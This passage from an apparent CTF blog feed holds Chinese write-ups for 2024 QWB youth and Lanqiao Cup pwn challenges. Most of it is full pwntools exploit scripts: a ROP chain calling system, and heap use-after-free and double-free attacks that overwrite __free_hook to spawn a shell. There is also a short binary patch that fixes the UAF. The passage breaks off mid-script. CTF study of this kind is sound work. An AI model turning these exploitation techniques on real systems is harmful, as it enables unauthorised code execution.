class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;Please input your name:&quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    rl(<span class="string">&quot;Album entry number: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    rl(<span class="string">&quot;Write your memory: &quot;</span>)</span><br><span class="line">    s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">2</span>))   </span><br><span class="line">    rl(<span class="string">&quot;Album entry number to edit: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    rl(<span class="string">&quot;Edit your memory: &quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">4</span>))   </span><br><span class="line">    rl(<span class="string">&quot;Album entry number to delete: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    rl(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">3</span>))   </span><br><span class="line">    rl(<span class="string">&quot;Album entry number to view: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">a=p.recv(<span class="number">16</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x5b0</span></span><br><span class="line">li(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(heap_base+<span class="number">0x30</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x7000000000000</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">9</span>)</span><br><span class="line">libc_base=get_addr64()-<span class="number">2018272</span></span><br><span class="line">li(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">edit(<span class="number">9</span>,p64(<span class="number">0x30000</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,p64(system))</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h5 id="防御：-2">防御：</h5><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733883773403-0a303c0f-8f94-4a99-a64f-cb7b48b3362c.png" alt=""></p><p>free函数内存在uaf漏洞</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733883833570-4138fe79-33d2-49e8-87cd-f94dfa8dbc50.png?x-oss-process=image%2Fformat%2Cwebp" alt=""></p><p>在en_frame段上抄汇编即可：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733885408448-5856dda8-83d3-48f1-b55d-3b8f5a87c944.png?x-oss-process=image%2Fformat%2Cwebp" alt=""></p><p>使用r8当介质，将chunklist[index]置零，最后跳转到call _free的下一段汇编</p><p>同时将call _free改为call en_frame该段地址</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733885821714-03eca445-af6e-48a2-8d4b-a3931946eb01.png?x-oss-process=image%2Fformat%2Cwebp" alt=""></p><p>成功防御：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/48239638/1733887117902-79afe25c-63ea-4b05-a34a-fd1397f06fb9.png" alt=""></p><h1></h1>]]></content>
    
    
    <summary type="html">2024qwb青少年</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2024蓝桥杯</title>
    <link href="https://www.thir0th.xyz/posts/1b9e3ed2.html"/>
    <id>https://www.thir0th.xyz/posts/1b9e3ed2.html</id>
    <published>2025-04-20T06:31:35.000Z</published>
    <updated>2025-05-07T08:27:01.284Z</updated>
    
    <content type="html"><![CDATA[<h1>2024蓝桥杯</h1><p>题目复现，也是有一定的收获，基本就是堆块错位的利用，没有uaf的话需要提取布置好size，有的话直接打</p><h3 id="线上">线上</h3><h4 id="第一题">第一题</h4><p>签到题，$0绕过检测，重定向输出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;restricted stack.&quot;)</span><br><span class="line">sl(b&#x27;$0\x00&#x27;)</span><br><span class="line"></span><br><span class="line">sh=0x601090</span><br><span class="line">rl(&quot;...&quot;)</span><br><span class="line">rdi=0x0000000000400933</span><br><span class="line">payload=b&#x27;a&#x27;*(0x20+8)+p64(rdi)+p64(sh)+p64(rdi+1)+p64(elf.plt[&#x27;system&#x27;])</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="第二题">第二题</h4><p>只有一次uaf</p><p>2.31，add,free,edit,show四个功能函数</p><p>add固定只能申请0x50大小堆块</p><p>只存在一个漏洞</p><p>这里用到一个整理机制，tcachebin中不可以double free，但fastbin中可以，我们可以在fastbin中完成double free，先将tcachebin中的堆块清除，当我们申请一个堆块时，就会触发堆块分配进制，完成tcachebin attack</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722780531197-c394055d-ae85-42fb-998c-5852207d9eb0.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_1125%2Climit_0" alt=""></p><p><a href="https://www.yuque.com/xiachi/rx5cxd/fnnowgt0q7z7spst">https://www.yuque.com/xiachi/rx5cxd/fnnowgt0q7z7spst</a></p><p>我们提前布置好size，造成堆块错位，之后我们可以去修改下一个堆块的size，使其合并，free大堆块后，在申请一个小堆块，也就是导致错位的堆块，得到libc地址，再次利用这个错位堆块，去修改bins中的fd位，攻击free_hook</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1734602407786-17dcb0a5-80f8-40e5-9890-73fa9cf151a1.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)   </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span><br><span class="line">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span><br><span class="line">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def add(content):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line">sleep(0.1)</span><br><span class="line">s(content)</span><br><span class="line">def free(i):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(str(i))</span><br><span class="line">def show(i):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(3))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(str(i))</span><br><span class="line">def uaf(i):</span><br><span class="line">rl(&quot;4.exit&quot;)</span><br><span class="line">sl(str(2106373))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sl(str(i))</span><br><span class="line"></span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">add(p64(0)*5+p64(0x61))</span><br><span class="line">for i in range(12):#2-13</span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">for i in range(9):</span><br><span class="line">free(i+2)</span><br><span class="line">uaf(0)</span><br><span class="line">free(1)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">for i in range(7):#0-6</span><br><span class="line">add(b&#x27;b&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;\x30&#x27;)</span><br><span class="line"></span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">add(p64(0)*5+p64(0x421))</span><br><span class="line">free(6)</span><br><span class="line">add(b&#x27;a&#x27;)</span><br><span class="line">show(6)</span><br><span class="line">libc_base=get_addr64()-2019169</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">malloc_hook,free_hook=get_hook()</span><br><span class="line"></span><br><span class="line">free(11)</span><br><span class="line">free(6)</span><br><span class="line">free(10)</span><br><span class="line">#bug()</span><br><span class="line">add(p64(0)*5+p64(0x61)+p64(free_hook))</span><br><span class="line">add(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">add(p64(system))</span><br><span class="line">#bug()</span><br><span class="line">free(10)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="线下">线下</h3><h4 id="第一题-2">第一题</h4><p>2.27的of by one</p><p>add,free,edit,show四个功能函数，add只能申请&lt;0x100的堆块</p><p>开局一个伪随机数绕过，直接绕之后house of botcake泄露libc地址，of by one造成堆块重叠后攻击bins中的fd位为free_hook，最后get_shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">from 